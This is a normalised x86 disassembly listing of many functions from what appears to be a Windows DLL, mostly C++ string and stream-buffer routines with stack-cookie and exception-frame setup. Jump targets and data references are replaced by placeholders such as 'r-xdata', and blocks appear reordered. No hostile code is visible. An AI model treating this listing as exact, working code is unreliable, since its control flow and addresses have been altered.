push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_100164a1
mov [ esi ] ax
add esi 0x2
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_100031d0
push ebp
mov ebp esp
sub esp 0x8
mov al [ ebp + 0x8 ]
add ecx 0x18
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push 0x1
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] al
push edx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x8 ] 0x0
call sub_10016639
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
mov esp ebp
pop ebp
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_10003210
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
add ecx 0x18
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
lea ebx [ ebx ]
mov [ edi ] ax
inc esi
add edi 0x2
cmp esi ebx
jne r-xdata
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov al [ esi ]
push ecx
lea edx [ ebp + 0x10 ]
push edx
mov [ ebp + 0x8 ] al
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov [ ebp + 0x10 ] 0x0
call sub_10016639
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
pop edi
sub_10003280
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
add ecx 0x18
push ecx
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0x10 ] 0x0
call sub_10015dc5
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp - 0xc ]
sub_100032d0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x10
add ecx 0x18
mov [ ebp - 0x14 ] ecx
mov [ edi ] al
add esi 0x2
inc edi
cmp esi ebx
jne r-xdata
mov al [ ebp - 0xc ]
mov ecx [ ebp - 0x14 ]
movzx eax [ esi ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x10 ] 0x0
call sub_10015dc5
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0x10 ]
jne r-xdata
sub_10003340
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_1001750d
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_10003380
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10016fb6
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_100033b0
push ebp
mov ebp esp
and esp 0xfffffff8
and eax 0x17
sub esp 0x18
mov [ ecx + 0xc ] eax
mov ecx [ ecx + 0x10 ]
and ecx eax
push esi
push edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov esi 0x1
test cl 0x4
je r-xdata
push 0x0
push 0x0
call sub_10017df7
test cl 0x2
je r-xdata
call sub_10015f01
mov edi eax
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc ] r--data
call sub_10016f5a
push r--data
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_10017df7
call sub_10015f01
lea ecx [ esp + 0x8 ]
push ecx
lea ecx [ esp + 0x10 ]
mov edi eax
mov [ esp + 0xc ] r--data
call sub_10016f5a
push r--data
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_10017df7
call sub_10015f01
lea edx [ esp + 0x8 ]
push edx
lea ecx [ esp + 0x10 ]
mov edi eax
mov [ esp + 0xc ] r--data
call sub_10016f5a
push r--data
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_10017df7
sub_100034b0
push ebp
mov ebp esp
push ecx
mov ecx [ eax + 0x30 ]
push esi
mov esi [ ecx ]
push 0x0
lea ecx [ ebp - 0x4 ]
mov [ edi ] esi
call sub_100163b9
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_100163e1
mov eax edi
pop esi
mov esp ebp
pop ebp
retn
inc eax
mov [ esi + 0x4 ] eax
sub_100034f0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
xor edi edi
push edi
xor eax eax
mov ecx esi
mov [ esi + 0x30 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x201
mov [ esi + 0x18 ] 0x6
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call sub_100033b0
push 0x4
call sub_1001740d
mov ebx eax
add esp 0x4
cmp ebx edi
je r-xdata
mov [ esi + 0x30 ] edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call sub_100162d0
mov [ ebx ] eax
call sub_1001608f
push edi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_100163b9
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x8 ]
call sub_100163e1
mov [ esi + 0x30 ] ebx
pop edi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ecx + 0x4 ] eax
sub_10003590
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10017006
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100035c0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10017006
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100035f0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_10015fc5
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_10003620
push ebp
mov ebp esp
push 0xffffffff
push sub_100293a5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x124
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov ebx edx
mov [ ebp - 0x84 ] esi
mov [ ebp - 0x88 ] ebx
mov [ ebx ] esi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
mov eax 0x1
xor edx edx
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x130 ]
push eax
call sub_10003eb0
lea ecx [ ebp - 0x2c ]
push ecx
lea edx [ ebp - 0x130 ]
push edx
mov [ ebp - 0x4 ] 0x2
call sub_10004e10
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax + 0xc ]
add ecx eax
and dl 0x6
movsx eax dl
add esp 0x8
neg eax
sbb eax eax
not eax
lea edi [ esi + 0x8 ]
test ecx eax
je r-xdata
lea ecx [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0x1
call sub_10003850
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x2c ]
mov eax ecx
cmp edx edi
jae r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100173b1
add esp 0x4
cmp [ eax ] 0x22
jne r-xdata
lea eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x2c ]
call sub_10003dd0
cmp edx edi
jae r-xdata
mov eax [ ebp - 0x1c ]
cmp [ ecx + eax * 2 - 0x2 ] 0x22
jne r-xdata
lea ecx [ ebp - 0x2c ]
xor edx edx
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x64 ] dx
lea eax [ ebp - 0x130 ]
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x4
call sub_10005040
add esp 0x4
push 0xffffffff
mov ecx 0x1
lea eax [ ebp - 0x80 ]
lea edx [ ebp - 0x2c ]
call sub_10001b50
mov edx eax
lea eax [ ebp - 0x64 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x5
call sub_10004dd0
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_100020f0
cmp [ ebp - 0x34 ] edi
jb r-xdata
add eax 0xfffffffe
push eax
mov ecx 0x1
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x2c ]
call sub_10001b50
mov ecx eax
mov [ ebp - 0x4 ] 0x3
call sub_100020f0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x34 ] edi
jb r-xdata
xor edx edx
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100173b1
add esp 0x4
lea edx [ ebp - 0x2c ]
push edx
lea eax [ ebp - 0x130 ]
push eax
call sub_10004e10
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax + 0xc ]
add ecx eax
and dl 0x6
movsx eax dl
add esp 0x8
neg eax
sbb eax eax
not eax
test ecx eax
jne r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100173b1
add esp 0x4
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_100173b1
add esp 0x4
mov ecx [ ebp - 0x64 ]
push ecx
call sub_100173b1
add esp 0x4
jmp r-xdata
sub_10003850
push ebp
mov ebp esp
push 0xffffffff
push sub_1002867b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
lea edi [ ecx + 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov [ ecx + edi - 0x60 ] r--data
lea ecx [ edi - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_10003fa0
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi - 0x60 ]
mov eax [ edx + 0x4 ]
mov [ eax + edi - 0x60 ] r--data
mov ecx [ edi - 0x50 ]
mov edx [ ecx + 0x4 ]
mov [ edx + edi - 0x50 ] r--data
mov eax [ edi - 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + edi - 0x60 ] r--data
push edi
mov [ edi ] r--data
call sub_10015fc5
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10003920
push ecx
push esi
mov esi ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
pop edi
mov eax esi
pop esi
pop ecx
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
call sub_100033b0
or eax 0x4
sub_100039b0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ esi ] r--data
test ebx ebx
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_10016412
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call sub_100173b1
add esp 0x4
pop edi
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x8 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_10003a30
push esi
mov esi eax
mov eax [ esi + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x1c ]
mov ecx esi
call edx
movzx eax ax
mov ecx [ esi + 0x30 ]
cmp [ ecx ] 0x1
jle r-xdata
mov eax [ esi + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax ecx
pop esi
retn
test eax eax
je r-xdata
mov eax ecx
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
add eax 0x2
mov [ esi ] eax
movzx eax [ eax ]
pop esi
retn
mov edx [ esi ]
mov eax [ edx + 0x18 ]
mov ecx esi
call eax
movzx eax ax
movzx eax ax
pop esi
retn
mov edx [ esi + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov edx [ esi + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ eax ]
movzx eax [ eax ]
movzx eax ax
pop esi
retn
mov eax edx
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
movzx eax [ ecx ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_10003b10
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
lea edx [ eax + 0x2 ]
mov [ esi ] edx
movzx eax [ eax ]
pop esi
retn
mov eax ecx
pop esi
retn
sub_10003b40
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
mov edi [ ebp + 0x10 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp edi eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov eax [ esp + 0xc ]
call sub_10004910
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0x1c ]
call eax
movzx ecx ax
mov edx 0xffff
cmp dx cx
je r-xdata
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
add [ esp + 0x10 ] 0x1
mov [ eax - 0x2 ] cx
mov [ ebp + 0x8 ] eax
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc edi 0xffffffff
mov [ ebp + 0x10 ] edi
cmp edi ebx
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ esp + 0xc ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
lea edi [ esi + esi ]
push edi
push edx
push eax
call sub_100183c0
add [ ebp + 0x8 ] edi
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x30 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ ecx ] esi
mov eax [ eax + 0x20 ]
add [ eax ] edi
mov edi [ ebp + 0x10 ]
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
test edi edi
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx edi
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_10003c40
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
mov edi [ ebp + 0x10 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp edi eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov eax [ esp + 0xc ]
call sub_10004930
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx ]
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0xc ]
call eax
mov ecx 0xffff
cmp cx ax
je r-xdata
jg r-xdata
add [ ebp + 0x8 ] 0x2
add [ esp + 0x10 ] 0x1
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc edi 0xffffffff
mov [ ebp + 0x10 ] edi
cmp edi ebx
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov ecx [ esp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
lea edi [ esi + esi ]
push edi
push eax
mov eax [ edx ]
push eax
call sub_100183c0
add [ ebp + 0x8 ] edi
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x34 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ ecx ] esi
mov eax [ eax + 0x24 ]
add [ eax ] edi
mov edi [ ebp + 0x10 ]
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
test edi edi
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx edi
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_10003d30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x14
sub_10003d60
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x20
sub_10003dd0
push ebp
mov ebp esp
push 0xffffffff
push sub_100290c2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ ebx + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp eax esi
ja r-xdata
mov edi [ ebx + 0x4 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
xor ecx ecx
mov [ ebp - 0x4 ] 0x1
cmp edi ecx
je r-xdata
mov ecx ebx
call sub_10002460
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
push ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ecx
mov [ edi ] ax
push esi
mov edi [ ebx + 0x4 ]
mov ecx [ ebx ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x14 ] edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp edi ecx
je r-xdata
mov ecx ebx
call sub_10002460
xor edx edx
push ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ecx
mov [ edi ] dx
push eax
jmp r-xdata
or eax 0xffffffff
call sub_10001db0
sub_10003eb0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002902f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ edi ] r--data
mov [ edi + 0x10 ] r--data
mov [ edi + 0x60 ] r--data
lea esi [ edi + 0x18 ]
push esi
mov [ ebp - 0x4 ] eax
push edi
mov [ ebp - 0x10 ] 0x1
call sub_10004950
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
push esi
mov [ edi + ecx ] r--data
mov [ ebp - 0x14 ] esi
call sub_10004a00
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
cmp [ ebx + 0x14 ] 0x8
mov eax [ ebx + 0x10 ]
jb r-xdata
xor ecx ecx
mov [ esi + 0x3c ] ecx
mov [ esi + 0x40 ] ecx
cmp eax ecx
je r-xdata
mov ebx [ ebx ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push ebx
call sub_10004af0
sub_10003fa0
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov ecx esi
pop esi
jmp sub_100039b0
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push ecx
call sub_100173b1
add esp 0x4
sub_10004010
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov ax [ ebp + 0x8 ]
mov edx 0xffff
cmp dx ax
jne r-xdata
mov edx [ esi + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
cmp eax ecx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
lea ebx [ edx + ebx * 2 ]
cmp edx ebx
jae r-xdata
mov edi [ esi + 0x34 ]
mov edi [ edi ]
lea eax [ eax + edi * 2 ]
sub eax ecx
mov [ edx ] ecx
mov ecx [ esi + 0x34 ]
sar eax 0x1
mov [ ecx ] eax
pop ebx
pop edi
mov eax 0xffff
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jne r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
pop ebx
lea edx [ ecx + 0x2 ]
mov [ esi ] edx
pop edi
mov [ ecx ] ax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x34 ]
mov ebx [ eax ]
mov ecx [ esi + 0x10 ]
add ebx ebx
sub ebx [ ecx ]
add ebx edi
sar ebx 0x1
xor ebx ebx
jmp r-xdata
test eax eax
je r-xdata
mov eax 0x20
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
lea ecx [ ecx ]
mov edx 0x7fffffff
sub edx eax
cmp edx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
mov ecx eax
mov [ ebp - 0x4 ] eax
call sub_10002650
mov edi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov edx [ esi + 0x24 ]
mov eax [ ebp - 0x4 ]
mov [ edx ] edi
lea edx [ eax + eax ]
mov eax [ esi + 0x34 ]
sar edx 0x1
mov [ eax ] edx
test [ esi + 0x40 ] 0x4
jne r-xdata
lea edx [ ebx + ebx ]
push edx
push ecx
push edi
call sub_100183c0
mov ecx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov edx [ esi + 0x30 ]
sar edi 0x1
mov [ edx ] edi
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov edx [ esi + 0x20 ]
mov [ edx ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov edx [ esi + 0x3c ]
sub edx ecx
sar edx 0x1
lea eax [ edi + edx * 2 ]
mov edx [ esi + 0x24 ]
mov [ esi + 0x3c ] eax
mov eax [ edx ]
mov edx [ esi + 0x14 ]
mov ebx [ edx ]
sub ebx ecx
sub eax ecx
sar ebx 0x1
sar eax 0x1
lea ebx [ edi + ebx * 2 ]
mov [ edx ] ebx
mov edx [ esi + 0x24 ]
lea eax [ edi + eax * 2 ]
mov [ edx ] eax
mov edx [ ebp - 0x4 ]
add edx edx
sub edx eax
mov eax [ esi + 0x34 ]
add edx edi
sar edx 0x1
mov [ eax ] edx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov edx [ esi + 0x20 ]
mov edx [ edx ]
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub edx ecx
sar edx 0x1
lea edx [ edi + edx * 2 ]
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub eax edx
mov [ edi ] edx
mov edx [ esi + 0x30 ]
add eax 0x2
sar eax 0x1
mov [ edx ] eax
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov ax [ ebp + 0x8 ]
pop ebx
pop edi
mov [ ecx ] ax
pop esi
mov esp ebp
pop ebp
retn 0x4
push ecx
call sub_100173b1
add esp 0x4
sub_10004200
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax 0xffff
pop ebp
retn 0x4
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov dx [ ebp + 0x8 ]
push esi
mov esi 0xffff
cmp si dx
pop esi
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
add [ eax ] 0xfffffffe
mov eax 0xffff
cmp ax dx
je r-xdata
cmp dx [ eax - 0x2 ]
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
mov [ eax ] dx
movzx eax dx
pop ebp
retn 0x4
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_10004270
mov edx [ ecx + 0x20 ]
push esi
mov esi [ edx ]
test esi esi
